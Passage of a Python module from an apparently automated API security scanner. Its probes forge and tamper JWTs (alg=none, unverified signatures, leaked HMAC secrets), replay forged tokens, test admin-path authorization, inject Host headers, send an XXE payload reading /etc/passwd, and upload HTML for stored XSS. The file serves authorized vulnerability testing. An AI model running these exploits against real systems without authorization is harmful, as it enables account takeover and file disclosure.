"""
execution/probes.py — Active exploit probes
============================================
QAX's runner could only send HTTP requests and click UI. Some bugs need MORE than
that to prove — forging a token with a leaked secret, or crashing an endpoint with
oversized input. Probes are that broader execution vocabulary: each actively tries
an exploit and returns hard evidence when it works.

The crown jewel is forge_jwt: it signs a JWT with the secret the AppModel found
hardcoded in config and uses it to impersonate a freshly-registered victim — the
critical bug QAX was structurally unable to reach. Signing is pure stdlib HMAC (no
new dependency), covering the symmetric HS256/384/512 algorithms a hardcoded secret
implies.

All probes are best-effort and never raise to the caller.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import re
import time
import uuid

import requests

from services.results import ProbeFinding

logger = logging.getLogger(__name__)

_HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def _b64(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def sign_jwt_hs(secret: str, algorithm: str, claims: dict) -> str | None:
    """Sign a JWT with an HMAC (symmetric) algorithm using only the stdlib."""
    hasher = _HASHES.get((algorithm or "HS256").upper())
    if hasher is None:
        return None
    header = _b64(json.dumps({"alg": algorithm.upper(), "typ": "JWT"},
                             separators=(",", ":")).encode())
    payload = _b64(json.dumps(claims, separators=(",", ":")).encode())
    signing_input = header + b"." + payload
    sig = _b64(hmac.new(secret.encode(), signing_input, hasher).digest())
    return (signing_input + b"." + sig).decode()


def _b64url_decode(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def _jwt_payload_segment(token: str):
    """(parts, payload_dict) for a well-formed JWT, else None."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        return parts, json.loads(_b64url_decode(parts[1]))
    except Exception:
        return None


def jwt_flaws_probe(model, base_url: str, *, session: requests.Session | None = None,
                    auth: dict | None = None) -> list[ProbeFinding]:
    """
    Deep JWT-validation flaws, proven with a CONTROL. Needs a VALID token (supplied
    or self-registered) and a protected endpoint where valid→2xx and no-token→401.
    Then it tampers the valid token and checks the endpoint still accepts it:
      • header alg=none + empty signature accepted → the algorithm isn't enforced (P1).
      • a garbage signature accepted → the signature isn't verified at all (P1).
    A correct server (algorithms=[HS256], signature+exp checked) rejects both → quiet.
    No secret needed — this catches bugs forge-jwt (which needs a leaked secret) can't.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    target = next((str(e.get("path")) for e in getattr(model, "endpoints", [])
                   if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
                   and e.get("auth_required") and "{" not in str(e.get("path", ""))), None)
    target = target or recipe.get("identity_path")
    if not target:
        _no_candidates(sess, "jwt-flaws", "protected GET endpoint (or identity endpoint) to test a token against")
        return out
    token = _resolve_token(sess, base, recipe, model, f"jwtf_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
    if not token:
        _skip(sess, "jwt-flaws", "no auth token — none supplied and self-registration/login failed",
              needs="auth-token")
        return out
    url = f"{base}{target}"

    def code_with(tok):
        try:
            return sess.get(url, headers=_auth_headers(tok, auth), timeout=15).status_code
        except Exception:
            return None

    try:
        s_notoken = sess.get(url, timeout=15).status_code
    except Exception:
        _unreached(sess, "jwt-flaws", 1)
        return out
    s_valid = code_with(token)
    # Controls: the valid token must work AND the endpoint must reject no token.
    if not (isinstance(s_valid, int) and 200 <= s_valid < 300):
        _skip(sess, "jwt-flaws", f"could not exercise it: the valid token was not accepted on GET {target} "
                                 f"(HTTP {s_valid}), so a tampered one has nothing to be compared with",
              needs="auth-token")
        return out
    if s_notoken not in (401, 403):
        _skip(sess, "jwt-flaws", f"GET {target} answers without any token (HTTP {s_notoken}) — it is not "
                                 f"access-controlled, so token forgery cannot be demonstrated there",
              kind="not-applicable")
        return out

    parsed = _jwt_payload_segment(token)
    if not parsed:
        _skip(sess, "jwt-flaws", "the token is not a JWT", kind="not-applicable")
        return out
    parts = parsed[0]

    none_header = _b64(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode()).decode()
    alg_none = f"{none_header}.{parts[1]}."
    c = code_with(alg_none)
    if isinstance(c, int) and 200 <= c < 300:
        out.append(ProbeFinding(
            probe="jwt-flaws", title=f"JWT alg=none accepted — authentication bypass on GET {target}",
            exploited=True, severity="P1",
            evidence=(f"A token with header alg=none and NO signature was accepted (HTTP {c}, same as a "
                      f"valid token; no token → {s_notoken}). The server does not enforce the signing "
                      f"algorithm — anyone can forge a valid session."),
            target=target))

    tampered = f"{parts[0]}.{parts[1]}.{'A' * max(10, len(parts[2]))}"
    c = code_with(tampered)
    if isinstance(c, int) and 200 <= c < 300:
        out.append(ProbeFinding(
            probe="jwt-flaws", title=f"JWT signature not verified — any token forgeable on GET {target}",
            exploited=True, severity="P1",
            evidence=(f"A token with a garbage signature was accepted (HTTP {c}; no token → {s_notoken}). "
                      f"The server does not verify the signature — tokens can be forged at will."),
            target=target))
    return out


def forged_token_replay_probe(model, base_url: str, *, session: requests.Session | None = None,
                              auth: dict | None = None, limit: int = 15) -> list[ProbeFinding]:
    """
    Item 6 — probes feed a later pass: once a token is forgeable (the server does not
    verify the JWT signature), REPLAY a forged token across every OTHER protected
    endpoint, not just the one jwt_flaws proved it on. Proving forgeability is a
    property of the server, so a single confirmed flaw unlocks the whole protected
    surface — this sweeps it and reports each additional endpoint a forged token opens.

    Deterministic and zero-false-positive by construction:
      • Global gate: forgeability is first ESTABLISHED on a clean control endpoint
        (valid token → 2xx, no token → 401/403, forged token → 2xx). If the server
        verifies signatures, the forged token is rejected there and the probe is quiet.
      • Per endpoint: a sibling is reported only when that endpoint itself rejects the
        no-token request (so it is genuinely protected) AND accepts the forged one.
    The control endpoint itself is skipped — jwt_flaws already reports it — so this
    only ever adds the SIBLINGS.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    def code(url: str, headers: dict | None):
        try:
            return sess.get(url, headers=headers or {}, timeout=15).status_code
        except Exception:
            return None

    def is2xx(c) -> bool:
        return isinstance(c, int) and 200 <= c < 300

    token = _resolve_token(sess, base, recipe, model,
                           f"ftr_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
    if not token:
        _skip(sess, "forged-token-replay", "no auth token — none supplied and self-registration/login failed",
              needs="auth-token")
        return out
    parsed = _jwt_payload_segment(token)
    if not parsed:
        _skip(sess, "forged-token-replay", "the token is not a JWT", kind="not-applicable")
        return out   # not a JWT bearer scheme — this probe doesn't apply
    parts = parsed[0]
    forged = f"{parts[0]}.{parts[1]}.{'A' * max(10, len(parts[2]))}"   # tampered signature

    # Ordered, unique, protected GET endpoints with no path param (safe to replay).
    targets: list[str] = []
    seen_paths: set[str] = set()
    for e in getattr(model, "endpoints", []):
        if (isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
                and e.get("auth_required") and "{" not in str(e.get("path", ""))):
            p = str(e.get("path", ""))
            if p and p not in seen_paths:
                seen_paths.add(p)
                targets.append(p)
    if not targets:
        _no_candidates(sess, "forged-token-replay", "protected GET endpoint without path parameters")
        return out

    # 1) Establish forgeability on the first clean control endpoint.
    control_path = None
    had_clean_control = False
    valid_rejected = 0
    for p in targets:
        url = f"{base}{p}"
        if not is2xx(code(url, _auth_headers(token, auth))):
            valid_rejected += 1
            continue   # the VALID token was rejected here — not a clean control
        if code(url, None) not in (401, 403):
            continue   # public — no protection to bypass
        had_clean_control = True
        if is2xx(code(url, _auth_headers(forged, auth))):
            control_path = p   # forgery confirmed server-wide
        break                  # the first clean control is decisive either way
    if not control_path:
        if not had_clean_control:
            if valid_rejected == len(targets):
                _skip(sess, "forged-token-replay", f"the valid token was rejected on all {len(targets)} "
                                                   f"protected endpoint(s), so a forged one has nothing to be "
                                                   f"compared with", needs="auth-token")
            else:
                _skip(sess, "forged-token-replay", "no protected endpoint gave a clean control (valid token "
                                                   "accepted AND a no-token request rejected)",
                      kind="not-applicable")
        return out             # clean control + forged rejected → server verifies signatures → quiet

    # 2) Sweep the remaining protected endpoints with the forged token.
    for p in targets:
        if p == control_path:
            continue           # jwt_flaws already reports the control endpoint
        url = f"{base}{p}"
        s_notoken = code(url, None)
        if s_notoken not in (401, 403):
            continue           # not actually protected — no bypass to prove
        s_forged = code(url, _auth_headers(forged, auth))
        if is2xx(s_forged):
            out.append(ProbeFinding(
                probe="forged-token-replay",
                title=f"Forged JWT accepted on GET {p} — authentication bypass",
                exploited=True, severity="P1",
                evidence=(f"A token with a garbage signature was accepted on GET {p} "
                          f"(HTTP {s_forged}; no token → {s_notoken}). The signature flaw proven on "
                          f"GET {control_path} unlocks this endpoint too — forging one token grants "
                          f"access across the protected surface."),
                target=p))
        if len(out) >= limit:
            break
    return out


def _skip(sess, probe: str, reason: str, kind: str = "missing-prerequisite",
          needs: str | None = None) -> None:
    """
    Record that a probe could NOT run, and why — so a quiet scan is never read as a
    clean one ("absence of a finding != a pass"). `kind` is "missing-prerequisite"
    (the probe needed something QAX didn't have: a second identity, a working login…
    — a real coverage gap worth surfacing) or "not-applicable" (the app has nothing
    for this probe to test — informational). `needs` is a short key for WHAT would
    unblock it ("token_b", "auth-token", …) so the report can ask the operator ONCE
    ("supply X → enables A, B, C") instead of repeating one note per probe.
    A no-op unless the caller (ProbeService)
    opened a ledger on the session, so probes run in isolation write nothing extra.
    Never raises.
    """
    try:
        ledger = getattr(sess, "_qax_skips", None)
        if isinstance(ledger, list):
            item = {"probe": probe, "reason": reason, "kind": kind}
            if needs:
                item["needs"] = needs
            if item not in ledger:
                ledger.append(item)
    except Exception:
        pass


_SSRF_WAIT = 3.0            # seconds to wait for the out-of-band callback after each injected URL


def _is_local_target(base_url: str) -> bool:
    """True when the target is on this machine (loopback) — an out-of-band callback to 127.0.0.1 can reach back."""
    from urllib.parse import urlparse
    host = (urlparse(base_url if "//" in base_url else "//" + base_url).hostname or "").lower()
    return host in ("localhost", "::1") or host.startswith("127.") or host == "0.0.0.0"


def _no_candidates(sess, probe: str, what: str) -> None:
    """The app has nothing for this probe to test (informational — not a coverage gap)."""
    _skip(sess, probe, f"no {what} in this app", kind="not-applicable")


def _need_token(sess, probe: str, token, needed: bool = True) -> None:
    """
    Record a gap when some endpoints need auth but no token could be obtained: they are then
    requested unauthenticated and the probe cannot say anything about their protected behaviour.
    """
    if needed and not token:
        _skip(sess, probe, "some endpoints need auth, but no token was supplied and self-registration/"
                           "login failed — those were requested without credentials", needs="auth-token")


def _registration_failed(sess, probe: str, path: str, status: int) -> None:
    """
    A probe that needs a self-registered user could not create one. 404/405 means the app has no
    such endpoint (not applicable — e.g. token-only APIs); any other rejection is a real gap.
    """
    if status in (404, 405):
        _skip(sess, probe, f"no self-registration endpoint answered at {path} (HTTP {status})",
              kind="not-applicable")
    else:
        _skip(sess, probe, f"the registration request at {path} was rejected (HTTP {status}), so the "
                           f"probe could not create the user it needs", needs="valid-body")


def _unreached(sess, probe: str, tried: int) -> None:
    """Every request failed at the network level — QAX could not talk to the endpoint(s) at all."""
    _skip(sess, probe, f"none of the {tried} candidate endpoint(s) could be reached (every request "
                       f"failed at the network level), so nothing was actually tested")


# Probes that WRITE to the target (create records / persist input) rather than only
# reading. Surfaced so a scan can warn the operator exactly what will mutate the
# target, and so an authorized-target gate can name them. (Read-only probes — sqli on
# a path param, bfla, forged-token-replay, headers, CORS, excessive-data, etc. — are
# not listed.)
MUTATING_PROBES = frozenset({
    "bola", "mass-assignment", "stored-xss", "persistence",
    "injection", "nosql", "malformed-input", "file-upload", "business-logic",
    "access-revocation",
    # typed_probes.py — the four that write (duplicate-rows is read-only)
    "boolean-false", "single-element-array", "date-order", "long-input",
})


# Path segments that denote a PRIVILEGED / admin-only function (OWASP API5 BFLA).
_PRIVILEGED_SEGS = ("admin", "administrator", "manage", "management", "internal",
                    "sysadmin", "superuser", "console", "backoffice", "moderator")


def bfla_probe(model, base_url: str, *, session: requests.Session | None = None,
               auth: dict | None = None, limit: int = 15) -> list[ProbeFinding]:
    """
    Broken Function-Level Authorization — OWASP API5 (distinct from BOLA/object-level):
    an ordinary user reaching a privileged, admin-namespaced FUNCTION. GET only, so it
    never triggers a destructive admin action.

    Zero-false-positive control, per endpoint: the endpoint is privileged by path
    (an /admin|/manage|/internal… segment), it REJECTS a no-token request (so it IS
    access-controlled, not public), yet it ACCEPTS a freshly-registered ORDINARY
    user's token. A correct app enforces the role and returns 401/403 to that user →
    the probe stays quiet.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    def code(url: str, headers: dict | None):
        try:
            return sess.get(url, headers=headers or {}, timeout=15).status_code
        except Exception:
            return None

    def is2xx(c) -> bool:
        return isinstance(c, int) and 200 <= c < 300

    # BFLA's whole control rests on the token belonging to an ORDINARY user.
    # The primary supplied --token is routinely a privileged/admin/service token
    # (the one a user hands QAX to "let it in"), so using it would make every
    # admin endpoint return 2xx and fabricate a P1 on a perfectly secure app.
    # Use a PROVABLY-ordinary identity only: a freshly self-registered user
    # (ordinary by construction), else the documented secondary token_b (userB,
    # the lower-privilege user by convention). NEVER the primary supplied token.
    token = _auth_token(sess, base, recipe, model,
                        f"bfla_{uuid.uuid4().hex[:8]}@example.com")
    if not token:
        token = (auth or {}).get("token_b")
    if not token:
        _skip(sess, "bfla", "no provably-ordinary identity — self-registration failed and no "
                            "second (non-admin) token was supplied (--token-b)", needs="token_b")
        return out

    seen: set = set()
    targets: list[str] = []
    for e in getattr(model, "endpoints", []):
        if not (isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
                and "{" not in str(e.get("path", ""))):
            continue
        p = str(e.get("path", ""))
        segs = [s.lower() for s in p.split("/") if s]
        if p and p not in seen and any(seg in _PRIVILEGED_SEGS for seg in segs):
            seen.add(p)
            targets.append(p)

    if not targets:
        _no_candidates(sess, "bfla", "admin-namespaced GET endpoint (/admin, /manage, /internal …)")
        return out
    answered = controlled = 0
    for p in targets[:limit]:
        url = f"{base}{p}"
        s_notoken = code(url, None)
        if s_notoken is not None:
            answered += 1
        if s_notoken not in (401, 403):
            continue   # not access-controlled (public, or broken differently) — can't prove escalation
        controlled += 1
        if is2xx(code(url, _auth_headers(token, auth))):
            out.append(ProbeFinding(
                probe="bfla",
                title=f"Broken function-level authorization on GET {p}",
                exploited=True, severity="P1",
                evidence=(f"A freshly-registered ORDINARY user reached the privileged endpoint "
                          f"GET {p} (HTTP 2xx; no token → {s_notoken}). The route is admin-namespaced "
                          f"and access-controlled, but enforces no role/function check — any user can "
                          f"call admin functions."),
                target=p))
    if not out:
        if not answered:
            _unreached(sess, "bfla", len(targets[:limit]))
        elif not controlled:
            _skip(sess, "bfla", f"none of the {len(targets[:limit])} admin-namespaced endpoint(s) rejected a "
                                f"request without a token, so none is access-controlled — escalation to them "
                                f"cannot be shown", kind="not-applicable")
    return out
def host_header_injection_probe(model, base_url: str, *, session: requests.Session | None = None,
                                auth: dict | None = None, limit: int = 25) -> list[ProbeFinding]:
    """
    Host-header injection / web-cache & reset-link poisoning. Send a request with a
    forged `Host` (and `X-Forwarded-Host`) and confirm the server used it to BUILD a
    URL in its response.

    Zero-false-positive: the forged host is a unique per-run marker; a hit counts only
    when it comes back in a URL CONTEXT — a `Location` header, or `://marker` / `//marker`
    in the body — proving the app trusts the Host header to construct links (not just a
    reflected error string). GET only. P2. No model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    cands = [e for e in getattr(model, "endpoints", [])
             if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
             and "{" not in str(e.get("path", ""))]
    if not cands:
        _no_candidates(sess, "host-header-injection", "parameter-free GET endpoint")
        return out
    token = None
    if any(e.get("auth_required") for e in cands):
        token = _resolve_token(sess, base, recipe, model, f"hhi_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        _need_token(sess, "host-header-injection", token)

    marker = f"qax{uuid.uuid4().hex[:10]}.evil.invalid"
    seen: set = set()
    reached = 0
    for e in cands[:limit]:
        path = str(e.get("path", ""))
        if path in seen:
            continue
        seen.add(path)
        headers = {"Host": marker, "X-Forwarded-Host": marker}
        if e.get("auth_required"):
            headers.update(_auth_headers(token, auth))
        try:
            r = sess.get(f"{base}{path}", headers=headers, timeout=15, allow_redirects=False)
        except Exception:
            continue
        reached += 1
        loc = str(r.headers.get("Location", ""))
        body = r.text or ""
        if marker in loc or f"//{marker}" in body or f"://{marker}" in body:
            where = "the Location header" if marker in loc else "the response body"
            out.append(ProbeFinding(
                probe="host-header-injection",
                title=f"Host header reflected into a URL on GET {path}",
                exploited=True, severity="P2",
                evidence=(f"A forged Host '{marker}' was used by the server to build a URL in "
                          f"{where} on GET {path}. An attacker can set the Host of a victim's request "
                          f"to poison password-reset links and the web cache."),
                target=path))
            break   # Host trust is a server-wide behavior — one proof suffices
    if not out and not reached:
        _unreached(sess, "host-header-injection", len(cands[:limit]))
    return out


_XXE_PAYLOAD = ('<?xml version="1.0"?>\n'
                '<!DOCTYPE qax [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
                '<qax>&xxe;</qax>')


def xxe_probe(model, base_url: str, *, session: requests.Session | None = None,
              auth: dict | None = None, limit: int = 8) -> list[ProbeFinding]:
    """
    XML external entity injection. POST an XML document whose external entity reads a
    local file, and confirm by the /etc/passwd signature (`root:x:0:0`) in the response.

    Zero-false-positive: that OS-file signature can only appear if the XML parser
    resolved an external entity — a hardened parser (entities disabled) returns nothing
    of the sort, and a JSON endpoint ignores the body. Only write endpoints are tried,
    with Content-Type application/xml. P1. No model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    cands = [e for e in getattr(model, "endpoints", [])
             if isinstance(e, dict) and str(e.get("method", "")).upper() in ("POST", "PUT", "PATCH")
             and "{" not in str(e.get("path", ""))]
    if not cands:
        _no_candidates(sess, "xxe", "write (POST/PUT/PATCH) endpoint without path parameters")
        return out
    token = None
    if any(e.get("auth_required") for e in cands):
        token = _resolve_token(sess, base, recipe, model, f"xxe_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        _need_token(sess, "xxe", token)

    seen: set = set()
    reached = 0
    for e in cands[:limit]:
        method = str(e.get("method", "POST")).upper()
        path = str(e.get("path", ""))
        if path in seen:
            continue
        seen.add(path)
        headers = {"Content-Type": "application/xml"}
        if e.get("auth_required"):
            headers.update(_auth_headers(token, auth))
        try:
            r = sess.request(method, f"{base}{path}", data=_XXE_PAYLOAD, headers=headers, timeout=15)
        except Exception:
            continue
        reached += 1
        if "root:x:0:0" in (r.text or ""):
            out.append(ProbeFinding(
                probe="xxe",
                title=f"XML external entity (XXE) file read on {method} {path}",
                exploited=True, severity="P1",
                evidence=(f"An XML body with an external entity (file:///etc/passwd) sent to "
                          f"{method} {path} returned the /etc/passwd signature 'root:x:0:0' — the "
                          f"parser resolved external entities, so an attacker can read local files "
                          f"(and often reach SSRF)."),
                target=path))
            break
    if not out and not reached:
        _unreached(sess, "xxe", len(cands[:limit]))
    return out


# Signals that an endpoint accepts a file upload.
_UPLOAD_KW = ("upload", "file", "avatar", "image", "attachment", "media", "photo",
              "document", "picture", "import")


def _extract_upload_url(text: str, fname: str, base: str) -> str | None:
    """Find the stored URL/path for our uploaded file in the upload response."""
    import re as _re
    m = _re.search(r'(https?://[^\s"\'<>]*' + _re.escape(fname) + r'|/[^\s"\'<>]*' + _re.escape(fname) + r')',
                   text or "")
    if not m:
        return None
    cand = m.group(1)
    if cand.startswith("http"):
        return cand if cand.startswith(base) else None   # egress: same-origin retrieval only
    return base + cand if cand.startswith("/") else f"{base}/{cand}"


def file_upload_probe(model, base_url: str, *, session: requests.Session | None = None,
                      auth: dict | None = None, limit: int = 6) -> list[ProbeFinding]:
    """
    Unrestricted file upload → stored XSS / code execution. Upload an HTML file with a
    unique marker, then RETRIEVE it and confirm the server serves it back as
    `text/html` with the marker intact.

    Zero-false-positive: a hit needs the whole round trip — the upload is accepted, the
    response yields a (same-origin) URL to our file, and fetching it returns our marker
    with an HTML content-type. A server that rejects the extension, renames away our
    name, or serves it non-executable (octet-stream/text-plain) gives no proof, so the
    probe stays quiet. P1. No model calls. (A mutating probe — it writes a file.)
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    def _is_upload(e):
        if not isinstance(e, dict) or str(e.get("method", "")).upper() not in ("POST", "PUT"):
            return False
        hay = (str(e.get("path", "")) + " " + " ".join(
            str(x) for x in (e.get("request_fields") or []))).lower()
        return any(k in hay for k in _UPLOAD_KW)

    cands = [e for e in getattr(model, "endpoints", []) if _is_upload(e)]
    if not cands:
        _no_candidates(sess, "file-upload", "file-upload endpoint")
        return out
    token = None
    if any(e.get("auth_required") for e in cands):
        token = _resolve_token(sess, base, recipe, model, f"upl_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        _need_token(sess, "file-upload", token)

    seen: set = set()
    reached = 0
    accepted_no_url = 0
    for e in cands[:limit]:
        method = str(e.get("method", "POST")).upper()
        path = str(e.get("path", ""))
        if path in seen:
            continue
        seen.add(path)
        from core.auth_recipe import field_names
        names = field_names(e.get("request_fields"))
        field = next((n for n in names if any(k in n.lower() for k in _UPLOAD_KW)), "file")
        marker = f"qax{uuid.uuid4().hex[:10]}"
        fname = f"{marker}.html"
        headers = _auth_headers(token, auth) if e.get("auth_required") else {}
        files = {field: (fname, f"<html><body>{marker}</body></html>", "text/html")}
        try:
            r = sess.request(method, f"{base}{path}", files=files, headers=headers, timeout=15)
        except Exception:
            continue
        reached += 1
        if not (200 <= r.status_code < 300):
            continue                       # rejected — the secure outcome for a dangerous extension
        url = _extract_upload_url(r.text or "", fname, base)
        if not url:
            accepted_no_url += 1           # accepted, but we cannot fetch the file back to check it
            continue
        try:
            g = sess.get(url, headers=headers, timeout=15)
        except Exception:
            continue
        ct = str(g.headers.get("Content-Type", "")).lower()
        if "html" in ct and marker in (g.text or ""):
            out.append(ProbeFinding(
                probe="file-upload",
                title=f"Unrestricted file upload served as HTML on {method} {path}",
                exploited=True, severity="P1",
                evidence=(f"An uploaded .html file was stored and served back from {url} as "
                          f"{g.headers.get('Content-Type')} with our marker intact — attacker HTML/JS "
                          f"executes in the app's origin (stored XSS; often a path to RCE)."),
                target=path))
            break
    if not out:
        if accepted_no_url:
            _skip(sess, "file-upload", f"{accepted_no_url} upload(s) were accepted, but the response "
                                       f"gave no URL to fetch the file back, so QAX could not check how "
                                       f"it is served (stored XSS / code execution)")
        elif not reached:
            _unreached(sess, "file-upload", len(cands[:limit]))
    return out


# Common GraphQL endpoint paths (GraphQL rarely appears in an OpenAPI spec).
_GRAPHQL_PATHS = ("/graphql", "/api/graphql", "/graphql/v1", "/v1/graphql", "/gql", "/query")
_INTROSPECTION_QUERY = {"query": "{__schema{queryType{name}}}"}


def graphql_introspection_probe(model, base_url: str, *, session: requests.Session | None = None,
                                auth: dict | None = None, limit: int = 10) -> list[ProbeFinding]:
    """
    GraphQL introspection left enabled (attack-surface disclosure). POST a minimal
    introspection query and confirm the server returned a real schema.

    Zero-false-positive: a hit counts only when the JSON response has
    `data.__schema.queryType.name` — i.e. introspection actually resolved the schema.
    A server with introspection disabled returns an error (no `data.__schema`), and a
    non-GraphQL endpoint returns something without it, so both stay quiet. The query is
    read-only. P2. No model calls.
    """
    sess = session or requests.Session()
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    headers = _auth_headers(auth.get("token"), auth) if auth and auth.get("token") else {}

    paths: list[str] = []
    for e in getattr(model, "endpoints", []):
        p = str(e.get("path", "")) if isinstance(e, dict) else ""
        if p and ("graphql" in p.lower() or "/gql" in p.lower()):
            paths.append(p)
    for p in _GRAPHQL_PATHS:
        paths.append(p)

    seen: set = set()
    reached = 0
    for p in paths:
        if p in seen or len(seen) >= limit:
            continue
        seen.add(p)
        try:
            r = sess.post(f"{base}{p}", json=_INTROSPECTION_QUERY, headers=headers, timeout=15)
        except Exception:
            continue
        reached += 1                      # the server ANSWERED (even a 404/HTML) — it was reachable
        try:
            data = r.json()
        except Exception:
            continue
        schema = (data.get("data") or {}).get("__schema") if isinstance(data, dict) else None
        if isinstance(schema, dict) and isinstance(schema.get("queryType"), dict) \
                and schema["queryType"].get("name"):
            out.append(ProbeFinding(
                probe="graphql-introspection",
                title=f"GraphQL introspection enabled on POST {p}",
                exploited=True, severity="P2",
                evidence=(f"POST {p} answered an introspection query with a full schema "
                          f"(queryType '{schema['queryType'].get('name')}'). An attacker can map "
                          f"every type, field and mutation — disable introspection in production."),
                target=p))
            break
    if not out and not reached:
        _unreached(sess, "graphql-introspection", len(seen))
    return out


# Numeric fields where a NEGATIVE value is business-nonsensical (a quantity/amount).
_QTY_FIELDS = ("quantity", "qty", "count", "units", "stock", "amount", "price",
               "total", "subtotal", "points", "credits", "balance_change")


def _benign_create_body(fields: list, target: str, value):
    """A create body that fills required fields with benign values, with `target` set."""
    from core.auth_recipe import nest_body
    body: dict = {}
    for f in fields:
        leaf = str(f).lower().rsplit(".", 1)[-1]
        if f == target:
            body[f] = value
        elif "email" in leaf:
            body[f] = f"bl_{uuid.uuid4().hex[:8]}@example.com"
        elif any(k in leaf for k in _QTY_FIELDS) or leaf in ("id", "num") or leaf.endswith("_id"):
            body[f] = 1
        else:
            body[f] = "test"
    return nest_body(body)


def business_logic_probe(model, base_url: str, *, session: requests.Session | None = None,
                         auth: dict | None = None, limit: int = 6) -> list[ProbeFinding]:
    """
    Business-logic flaw: a NEGATIVE quantity/amount accepted and stored on a create
    endpoint (a nonsensical order of -N items / a -N price). The one logic class with a
    clean behavioural control.

    Zero-false-positive control, per endpoint+field: a POSITIVE value must be accepted
    (2xx) — proving the endpoint works and uses the field — AND a DISTINCTIVE negative
    value must be accepted AND echoed back in the response (stored). A correct app
    rejects the negative (4xx), so it stays quiet. P2. No model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, field_names
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    cands = []
    for e in getattr(model, "endpoints", []):
        if not (isinstance(e, dict) and str(e.get("method", "")).upper() == "POST"
                and "{" not in str(e.get("path", ""))):
            continue
        names = field_names(e.get("request_fields"))
        tgt = next((n for n in names if any(k in n.lower().rsplit(".", 1)[-1] for k in _QTY_FIELDS)), None)
        if tgt:
            cands.append((e, names, tgt))
    if not cands:
        _no_candidates(sess, "business-logic", "create endpoint with a quantity/amount/price field")
        return out
    token = None
    if any(e.get("auth_required") for e, _, _ in cands):
        token = _resolve_token(sess, base, recipe, model, f"bl_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        if not token:
            _skip(sess, "business-logic", "the quantity/amount endpoints need auth, but no token was "
                                          "supplied and self-registration/login failed",
                  needs="auth-token")

    seen: set = set()
    controlled = 0
    for e, names, tgt in cands[:limit]:
        path = str(e.get("path", ""))
        key = (path, tgt)
        if key in seen:
            continue
        seen.add(key)
        headers = _auth_headers(token, auth) if e.get("auth_required") else {}
        neg = -(40000 + (uuid.uuid4().int % 9000))   # distinctive negative, unlikely by chance
        try:
            rp = sess.post(f"{base}{path}", json=_benign_create_body(names, tgt, 3), headers=headers, timeout=15)
            if not (200 <= rp.status_code < 300):
                continue   # positive control not accepted → can't establish the endpoint
            controlled += 1
            rn = sess.post(f"{base}{path}", json=_benign_create_body(names, tgt, neg), headers=headers, timeout=15)
        except Exception:
            continue
        if 200 <= rn.status_code < 300 and str(neg) in (rn.text or ""):
            out.append(ProbeFinding(
                probe="business-logic",
                title=f"Negative '{tgt}' accepted and stored on POST {path}",
                exploited=True, severity="P2",
                evidence=(f"POST {path} accepted and stored a negative '{tgt}' ({neg}) — a positive "
                          f"value was accepted too, and the negative was echoed back. Negative "
                          f"quantities/amounts are business-nonsensical (refund/credit abuse); a "
                          f"correct app rejects them."),
                target=path))
            break
    if not out and not controlled:
        _skip(sess, "business-logic", f"could not exercise it: the positive-value request was rejected or "
                                      f"failed on all {len(seen)} candidate endpoint(s), so a negative value "
                                      f"had nothing valid to be compared with", needs="valid-body")
    return out
# Path segments that mark a "membership / access grant" sub-resource — the thing an
# owner grants to another user and can revoke. The access-revocation probe keys on these.
_MEMBERSHIP_SEGS = ("collaborators", "collaborator", "members", "member", "access",
                    "permissions", "sharing", "shares", "invites", "invitations")
# Endpoints that return the CALLER's own identity, to learn user B's username.
_WHOAMI_PATHS = ("/user", "/api/v1/user", "/users/me", "/user/me", "/me", "/api/me",
                 "/account", "/profile", "/whoami")
# Fields that carry a username/login in a whoami or collection response.
_USERNAME_FIELDS = ("login", "username", "user_name", "handle", "slug", "name")


def _whoami(sess, base: str, token, auth: dict | None) -> str | None:
    """The caller's own username, read from a common identity endpoint (or None)."""
    for p in _WHOAMI_PATHS:
        try:
            r = sess.get(f"{base}{p}", headers=_auth_headers(token, auth), timeout=10)
        except Exception:
            continue
        if r.status_code != 200:
            continue
        try:
            body = r.json()
        except Exception:
            continue
        if isinstance(body, dict):
            for f in _USERNAME_FIELDS:
                if isinstance(body.get(f), str) and body[f].strip():
                    return body[f].strip()
    return None


def _owned_resource(sess, base: str, token, auth: dict | None,
                    params: list[str]) -> dict | None:
    """
    Concrete values for a resource A OWNS, to fill a grant/read path's params
    (e.g. {owner}/{repo} from A's own repo list). Tries the caller's own listing
